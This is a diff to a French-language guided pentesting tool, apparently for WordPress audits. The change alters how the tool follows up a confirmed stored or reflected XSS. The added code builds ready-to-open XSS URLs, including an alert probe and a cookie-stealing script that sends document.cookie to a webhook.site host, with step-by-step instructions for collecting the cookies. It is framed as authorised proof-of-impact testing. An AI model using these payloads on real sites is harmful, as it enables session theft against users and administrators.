@@ -49,8 +49,8 @@
 </head>
 <body>
 <div class="wrap">
-  <h1>🥋 Mode MANUEL guidé — tu exécutes, tu apprends <span style="font-size:12px;font-weight:700;background:#1f2937;color:#f59e0b;padding:3px 8px;border-radius:6px;vertical-align:middle">v2026-11-02f</span></h1>
-  <p style="margin:4px 0 0;font-size:12px;color:#9aa0b0">Si le badge de version n'est pas <b>v2026-11-02f</b> : fais <b>SYNC GitHub</b> puis recharge avec <b>Ctrl+Maj+R</b> (vide le cache). Tu verras alors les vraies commandes partout (upload, reset/session, JWT…).</p>
+  <h1>🥋 Mode MANUEL guidé — tu exécutes, tu apprends <span style="font-size:12px;font-weight:700;background:#1f2937;color:#f59e0b;padding:3px 8px;border-radius:6px;vertical-align:middle">v2026-11-02g</span></h1>
+  <p style="margin:4px 0 0;font-size:12px;color:#9aa0b0">Si le badge de version n'est pas <b>v2026-11-02g</b> : fais <b>SYNC GitHub</b> puis recharge avec <b>Ctrl+Maj+R</b> (vide le cache). Tu verras alors les vraies commandes partout (upload, reset/session, JWT…).</p>
   <p class="sub"><b>Ici c'est TOI qui lances chaque commande</b> (sur Kali), et l'outil te guide pas-à-pas + lit tes résultats + construit le rapport. C'est le mode pour <b>apprendre et aller jusqu'au bout toi-même</b>. (Pour un audit 100% automatique sans rien faire → bouton « Audit auto » dans WordPress.) Hors ligne. <b>Uniquement sous mandat / scope autorisé.</b></p>
 
   <div class="panel" id="scopePanel">
@@ -855,9 +855,19 @@ function scan(t){
     var xStored = /"><\s*(svg|img|script)|<svg\s+onload|<img\s+[^>]*onerror|stock|persist|commentaire|rechargement|autre utilisateur/i.test(raw);
     var xRefl   = /<svg\/onload|[?&][a-z0-9_]+=<\s*(svg|script|img)/i.test(raw);
     var xType = (xRefl && !xStored) ? 'xssr' : 'xss';
-    return {cls:'bad',msg:'🩹 XSS '+(xType==='xss'?'STOCKÉE':'RÉFLÉCHIE')+' CONFIRMÉE — ta charge est renvoyée dans la page SANS être échappée → le navigateur l\'exécute (popup). '+(xType==='xss'?'Persistante = elle touche les AUTRES visiteurs/admins = plus grave.':'Dans l\'URL/le paramètre : un lien piégé exécute du code chez la victime.')+' Preuve ajoutée au rapport.',
-      follow:[{t:'Preuve d\'impact (vol de session, PoC non destructif) — navigateur',c:'<script>new Image().src=\'https://TON-ID.webhook.site/?c=\'+document.cookie<\/script>',e:'Le code à copier = la ligne grise ci-dessus. 1) ouvre <b>webhook.site</b> (donne une URL unique). 2) dans le code, remplace <code>https://TON-ID.webhook.site/</code> par cette URL. 3) colle ce code dans le MÊME champ du site où l\'XSS a marché (navigateur). Le cookie reçu s\'affiche sur webhook.site = preuve. Non destructif. Si cookie HttpOnly, rien ne remonte (bon point).'}],
-      report:{type:xType}, unlock:null};
+    var xOpenUrl = U+'/?'+P+'=<svg/onload=alert(1337)>';
+    var xCookieUrl = U+'/?'+P+'=<script>new Image().src=\'https://TON-ID.webhook.site/?c=\'+document.cookie<\/script>';
+    var foll;
+    if(xType==='xssr'){
+      foll=[
+        {t:'➡️ Ouvre CETTE URL dans le navigateur (le « champ » = le paramètre « '+P+' »)',c:xOpenUrl,e:'Pas besoin de chercher un champ sur la page : pour une XSS réfléchie, l\'injection est DANS L\'URL. Ouvre ce lien dans le navigateur → une popup 1337 doit s\'afficher = XSS confirmée. (Le paramètre vulnérable est « '+P+' » — change-le en haut de l\'outil si ce n\'est pas le bon.) Astuce : dans la grosse sortie HTML, fais Ctrl+F « 1337 » pour voir où ta charge est tombée.'},
+        {t:'Preuve d\'impact (vol de session) — ouvre cette URL',c:xCookieUrl,e:'1) ouvre <b>webhook.site</b> → copie l\'URL unique. 2) remplace <code>https://TON-ID.webhook.site/</code> par cette URL. 3) ouvre l\'URL ci-dessus dans le navigateur → le cookie arrive sur webhook.site = preuve. Non destructif. Si cookie HttpOnly → rien ne remonte (bon point).'}
+      ];
+    } else {
+      foll=[{t:'Preuve d\'impact (vol de session) — DANS LE CHAMP qui se réaffiche',c:'<script>new Image().src=\'https://TON-ID.webhook.site/?c=\'+document.cookie<\/script>',e:'XSS STOCKÉE : le « champ » = le formulaire où tu as collé ta charge (commentaire, profil, nom…) et qui se réaffiche. 1) ouvre <b>webhook.site</b> → copie l\'URL. 2) remplace <code>https://TON-ID.webhook.site/</code> par cette URL. 3) colle ce code dans CE champ, enregistre, recharge. Le cookie arrive sur webhook.site = preuve. Non destructif. Si HttpOnly → rien ne remonte (bon point).'}];
+    }
+    return {cls:'bad',msg:'🩹 XSS '+(xType==='xss'?'STOCKÉE':'RÉFLÉCHIE')+' CONFIRMÉE — ta charge est renvoyée dans la page SANS être échappée → le navigateur l\'exécute (popup). '+(xType==='xss'?'Persistante = elle touche les AUTRES visiteurs/admins = plus grave. Le « champ » = le formulaire où tu as collé la charge (commentaire/profil).':'Pas de champ à chercher : l\'injection est DANS L\'URL (paramètre « '+P+' »). Ouvre l\'URL ci-dessous.')+' Preuve ajoutée au rapport.',
+      follow:foll, report:{type:xType}, unlock:null};
   }
   // Charge XSS ressortie ÉCHAPPÉE (&lt;svg / %3Cscript / entités) = le site encode = PAS de XSS (bon point).
   if(/(&lt;|&#x?0*3c;?|%3c)\s*\/?\s*(svg|script|img)/i.test(raw) && /onerror|onload|alert\s*\(|document\.cookie/i.test(raw)){
